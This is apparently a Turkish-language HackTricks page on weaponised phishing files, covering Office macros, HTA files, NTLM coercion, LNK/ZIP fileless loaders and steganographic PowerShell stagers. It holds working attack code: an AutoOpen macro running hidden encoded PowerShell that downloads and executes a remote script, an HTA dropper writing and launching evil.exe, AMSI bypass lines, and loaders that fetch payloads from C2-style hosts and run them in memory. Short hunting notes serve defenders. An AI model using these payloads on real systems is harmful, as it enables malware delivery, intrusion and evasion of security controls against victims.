# Phishing Dosyaları ve Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word bir dosyayı açmadan önce dosya veri doğrulaması gerçekleştirir. Veri doğrulama, OfficeOpenXML standardına karşı veri yapısı tanımlaması şeklinde yapılır. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, incelenen dosya açılmaz.

Genellikle makro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyanın adını değiştirmek ve yine de makro çalıştırma yeteneğini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarım gereği makroları desteklemez, ancak DOCM olarak adlandırılmış bir dosya RTF'ye yeniden adlandırıldığında Microsoft Word tarafından işlenecek ve makro çalıştırma yeteneğine sahip olacaktır.\
Aynı iç yapılar ve mekanizmalar Microsoft Office Suite içindeki tüm yazılımlar için geçerlidir (Excel, PowerPoint vb.).

Aşağıdaki komutu, bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları, makroları içeren uzak bir şablona (File –Options –Add-ins –Manage: Templates –Go) referans veriyorsa, makroları “çalıştırabilir” da.

### Harici Resim Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Kategoriler**: Bağlantılar ve Referanslar, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Belgeden rastgele kod çalıştırmak için makrolar kullanmak mümkündür.

#### Autoload functions

Ne kadar yaygınlarsa, AV'nin bunları tespit etme olasılığı o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Macros Kod Örnekleri
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Meta verileri elle kaldırın

Belge Denetleyicisini açmak için **File > Info > Inspect Document > Inspect Document**'e gidin. Bu, Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve ardından **Document Properties and Personal Information** yanında yer alan **Remove All**'ı seçin.

#### Doc Uzantısı

İşiniz bittiğinde, **Save as type** açılır menüsünü seçin ve formatı **`.docx`**'den **Word 97-2003 `.doc`**'e değiştirin.\
Bunu yapın çünkü **can't save macro's inside a `.docx`** ve macro-etkin **`.docm`** uzantısının etrafında bir **stigma** vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/email gateway'leri bunları tamamen engeller). Bu nedenle, bu **legacy `.doc` extension is the best compromise**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Dosyaları

Bir HTA, HTML ve VBScript ile JScript gibi scripting dillerini birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcı güvenlik modelinin kısıtlamaları olmadan "fully trusted" bir uygulama olarak çalışır.

Bir HTA, **`mshta.exe`** kullanılarak çalıştırılır; bu genellikle **Internet Explorer** ile birlikte yüklendiğinden **`mshta`** IE'ye bağımlıdır. Bu nedenle Internet Explorer kaldırıldıysa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Kimlik Doğrulamasını Zorlamak

NTLM kimlik doğrulamasını **"uzaktan"** **zorlamanın** birkaç yolu vardır; örneğin, kullanıcının erişeceği e-postalara veya HTML'ye **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbana **dosyaların adresini** gönderin; bu adresler **tetikleyecek** bir **kimlik doğrulamasını** yalnızca **klasörü açmak** için.

**Aşağıdaki sayfalarda bu fikirleri ve daha fazlasını inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Unutmayın, sadece hash'i veya kimlik doğrulamayı çalamazsınız, aynı zamanda **NTLM relay attacks** da gerçekleştirebilirsiniz:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Çok etkili kampanyalar, iki meşru yem belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP teslim eder. Hile şu ki, gerçek PowerShell loader, ZIP'in ham baytları içinde benzersiz bir işaretçiden sonra saklanır ve .lnk bunu bellekte tamamen carve ederek çalıştırır.

.lnk PowerShell one-liner tarafından uygulanan tipik akış:

1) Orijinal ZIP'i şu yaygın yollar içinde bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst dizini.  
2) ZIP baytlarını okuyun ve sabitlenmiş bir işaretçi bulun (ör., xFIQCV). İşaretçiden sonra gelen her şey gömülü PowerShell payload'dur.  
3) ZIP'i %ProgramData% içine kopyalayın, orada çıkartın ve meşru görünmek için yem .docx'i açın.  
4) Geçerli süreç için AMSI'yi bypass edin: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Bir sonraki aşamanın obfuskasyonunu kaldırın (ör., tüm # karakterlerini silin) ve bellekte çalıştırın.

Gömülü aşamayı carve edip çalıştırmak için örnek PowerShell iskeleti:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Gönderim genellikle itibarlı PaaS alt alan adlarını (ör. *.herokuapp.com) kötüye kullanır ve yükleri kısıtlayabilir (IP/UA'ya göre zararsız ZIP'ler sunar).
- Bir sonraki aşama sıklıkla base64/XOR shellcode'u dekripte eder ve disk artefaktlarını azaltmak için Reflection.Emit + VirtualAlloc ile çalıştırır.

Persistence kullanılan aynı zincirde
- COM TypeLib hijacking of the Microsoft Web Browser control, böylece IE/Explorer veya onu embed eden herhangi bir uygulama payload'u otomatik olarak yeniden başlatır. Ayrıntılar ve kullanıma hazır komutlar için burada bakınız:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verisine eklenmiş ASCII belirteç dizisini (ör. xFIQCV gibi) içeren ZIP dosyaları.
- .lnk — ZIP'i bulmak için üst/kullanıcı klasörlerini tarayan ve bir decoy document açan dosyalar.
- AMSI'ye [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla müdahale.
- Güvenilir PaaS domainlerinde barındırılan linklerle sonlanan uzun süre çalışan business thread'leri.

## Görüntülerde steganography-delimited payloads (PowerShell stager)

Son loader zincirleri, Base64 PowerShell stager'ı deşifre edip çalıştıran obfuskasyonlu bir JavaScript/VBS bırakıyor. Bu stager, benzersiz başlangıç/bitiş marker'ları arasına düz metin olarak gizlenmiş Base64-encoded .NET DLL içeren bir görüntü (çoğunlukla GIF) indirir. Script bu delimitörleri arar (sahada görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, Base64'ü byte'lara deşifre eder, assembly'i bellekte yükler ve C2 URL ile bilinen bir giriş metodunu çağırır.

İş akışı
- Aşama 1: Arşivlenmiş JS/VBS dropper → gömülü Base64'ü deşifre eder → PowerShell stager'ı -nop -w hidden -ep bypass ile başlatır.
- Aşama 2: PowerShell stager → görüntüyü indirir, marker-ile sınırlanmış Base64'i carve eder, .NET DLL'i bellekte yükler ve ör. VAI metodunu C2 URL ve seçeneklerle çağırır.
- Aşama 3: Loader final payload'u alır ve tipik olarak process hollowing ile güvenilir bir binary'e (genellikle MSBuild.exe) enjekte eder. Process hollowing ve trusted utility proxy execution hakkında daha fazlası için bakınız:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Görüntüden bir DLL çıkarıp bir .NET metodunu bellekte çağırmak için PowerShell örneği:

<details>
<summary>PowerShell stego payload çıkarıcı ve yükleyici</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notlar
- Bu, ATT&CK T1027.003 (steganography/marker-hiding) tekniğidir. Markörler kampanyalara göre değişir.
- AMSI/ETW bypass ve string deobfuscation genellikle assembly'i yüklemeden önce uygulanır.
- Hunting: indirilen görüntüleri bilinen delimiters için tarayın; PowerShell'in görüntülere erişip hemen Base64 blob'larını decode ettiğini tespit edin.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Yinelenen bir ilk aşama, arşiv içinde teslim edilen küçük, ağır şekilde obfuske edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı gömülü bir Base64 dizisini decode etmek ve sonraki aşamayı HTTPS üzerinden başlatmak için `-nop -w hidden -ep bypass` ile PowerShell'i çalıştırmaktır.

Skeleton logic (abstract):
- Kendi dosya içeriğini oku
- Junk string'ler arasındaki Base64 blob'unu tespit et
- ASCII PowerShell'e decode et
- `wscript.exe`/`cscript.exe` ile `powershell.exe`'i çağırarak çalıştır

Hunting cues
- Arşivlenmiş JS/VBS ekleri, komut satırında `-enc`/`FromBase64String` ile `powershell.exe` çalıştırıyorsa.
- `wscript.exe`'in kullanıcı temp yollarından `powershell.exe -nop -w hidden` çalıştırması.

## NTLM hash'lerini çalmak için Windows dosyaları

İlgili sayfaya bakın: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
